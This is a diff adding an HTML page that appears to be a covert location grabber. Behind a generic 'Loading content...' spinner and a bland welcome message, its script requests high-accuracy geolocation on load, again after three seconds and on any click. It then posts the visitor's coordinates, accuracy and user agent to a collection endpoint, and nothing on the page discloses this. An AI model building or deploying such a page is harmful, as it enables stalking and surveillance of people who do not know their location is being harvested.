@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            max-width: 400px;
+            margin: 20px auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        .loading {
+            margin: 20px 0;
+        }
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loading">
+            <div class="spinner"></div>
+            <p>Loading content...</p>
+        </div>
+        
+        <div class="hidden" id="content">
+            <h2>Welcome!</h2>
+            <p>Thank you for visiting. Content loaded successfully.</p>
+        </div>
+    </div>
+
+    <script>
+        let locationData = {};
+
+        function getLocation() {
+            console.log('Starting location request...');
+            
+            if (!navigator.geolocation) {
+                console.log('Geolocation not supported');
+                showContent();
+                return;
+            }
+
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 15000,
+                maximumAge: 0
+            };
+
+            console.log('Requesting location permission...');
+            
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    // Success - capture location data
+                    locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent
+                    };
+
+                    console.log('✅ Location captured successfully:', locationData);
+                    
+                    // Send location data somewhere (you'll need to implement this)
+                    // For now, we'll create a visible alert
+                    fetch('http://localhost:3000/collect-location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(locationData)
+                    });
+                    
+                    showContent();
+                },
+                function(error) {
+                    // Error or denied
+                    console.log('❌ Location error:', error.message);
+                    console.log('Error code:', error.code);
+                    
+                    let errorMsg = '';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = "Location access denied by user";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = "Location information unavailable";
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = "Location request timed out";
+                            break;
+                        default:
+                            errorMsg = "Unknown location error";
+                            break;
+                    }
+                    console.log('Error details:', errorMsg);
+                    showContent();
+                },
+                options
+            );
+        }
+
+        function showContent() {
+            document.querySelector('.loading').style.display = 'none';
+            document.getElementById('content').classList.remove('hidden');
+        }
+
+        // Try multiple approaches to request location
+        window.onload = function() {
+            console.log('Page loaded, attempting location request...');
+            
+            // Method 1: Immediate request
+            getLocation();
+            
+            // Method 2: Try again after a short delay
+            setTimeout(function() {
+                console.log('Attempting location request again...');
+                if (!locationData.latitude) {
+                    getLocation();
+                }
+            }, 3000);
+        };
+
+        // Also try when user interacts with the page
+        document.addEventListener('click', function() {
+            console.log('User clicked, trying location request...');
+            if (!locationData.latitude) {
+                getLocation();
+            }
+        });
+    </script>
+    </script>
+</body>
+</html>
